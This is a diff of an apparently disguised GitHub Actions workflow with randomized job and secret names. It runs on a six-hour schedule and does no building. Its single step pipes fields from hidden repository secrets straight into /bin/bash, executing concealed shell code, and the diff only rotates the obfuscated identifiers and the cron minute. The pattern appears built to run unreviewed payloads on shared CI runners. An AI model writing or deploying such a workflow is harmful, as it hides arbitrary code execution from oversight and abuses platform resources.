@@ -1,28 +1,26 @@
 name: luzhanyuan7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
-jobs:  # 13872
+    - cron: '12 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luzhanyuan7654
         env:
-          tmgsj2909: ${{ secrets.tmgsj2909 }}
+          ekr05836: ${{ secrets.ekr05836 }}
         run: |
-          echo $tmgsj2909 | jq -r .khqh76508 | /bin/bash
-          echo $jokn113 | jq -r .ouf8 | /bin/bash
-          echo $r4525 | jq -r .aj3097 | /bin/bash
-          echo $v6 | jq -r .wv1 | /bin/bash
-          echo $mka4 | jq -r .u449 | /bin/bash
-          echo $wr717 | jq -r .soxml13060 | /bin/bash
-          echo $a91 | jq -r .dnfy3929 | /bin/bash
-          echo $syz1 | jq -r .h16614 | /bin/bash
-          echo $kls61 | jq -r .ufkti686 | /bin/bash
-          echo $xtxr1 | jq -r .qntf1223 | /bin/bash
-          echo $ii5 | jq -r .qxq89751 | /bin/bash
-          echo $x7 | jq -r .pmc7 | /bin/bash
-          echo $kfhpy023 | jq -r .ebx66861 | /bin/bash
+          echo $ekr05836 | jq -r .vj0961 | /bin/bash
+          echo $a10 | jq -r .wbi9 | /bin/bash
+          echo $f095 | jq -r .kj25263 | /bin/bash
+          echo $oauk89 | jq -r .wahlz6 | /bin/bash
+          echo $yjkfi4628 | jq -r .dxo223 | /bin/bash
+          echo $owfgo43 | jq -r .j00 | /bin/bash
+          echo $hmp5 | jq -r .c73635 | /bin/bash
+          echo $zzy85919 | jq -r .ank9 | /bin/bash
 
